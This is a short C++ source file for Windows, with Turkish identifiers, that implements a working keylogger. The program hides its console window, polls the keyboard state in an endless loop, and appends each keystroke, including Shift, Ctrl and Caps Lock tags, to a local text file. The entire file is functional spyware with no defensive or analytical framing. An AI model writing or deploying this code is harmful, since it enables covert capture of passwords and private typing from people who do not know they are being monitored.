#include <iostream>
#include <fstream>
#include <windows.h>
#include <iterator>

#define LOG_FILE "text.txt"

void kaydet(std::string data) {
    std::fstream x;

    x.open(LOG_FILE, std::ios::app);

    x << data;

    x.close();
}

std::string translate(int key) {
    std::string sonuc;

    switch (key) {
    case VK_SPACE:
        sonuc = " ";
        break;

    case VK_RETURN:
        sonuc = "\n";
        break;

    case VK_BACK:
        sonuc = "\b";
        break;

    case VK_CAPITAL:
        sonuc = "[CAPS_LOCK]";
        break;

    case VK_SHIFT:
        sonuc = "[SHIFT]";
        break;

    case VK_MENU:
        sonuc = "[ALT]";
        break;

    case VK_TAB:
        sonuc = "[TAB]";
        break;

    case VK_CONTROL:
        sonuc = "[CTRL]";
        break;

    default:
        break;
    }
    return sonuc;
}

int main() {
    int ska[] = { VK_SPACE, VK_RETURN, VK_BACK, VK_TAB, VK_SHIFT, VK_CONTROL, VK_MENU, VK_CAPITAL };
    std::string skc;
    bool is_sk;

    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
    while (true) {
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                is_sk = std::find(std::begin(ska), std::end(ska), key) != std::end(ska);

                if (is_sk) {
                    skc = translate(key);

                    kaydet(skc);
                }
                else {
                    if (GetKeyState(VK_CAPITAL)) {
                        kaydet(std::string(1, (char)key));
                    }
                    else {
                        kaydet(std::string(1, (char)std::tolower(key)));
                    }
                }
            }
        }
    }

    return 0;
}
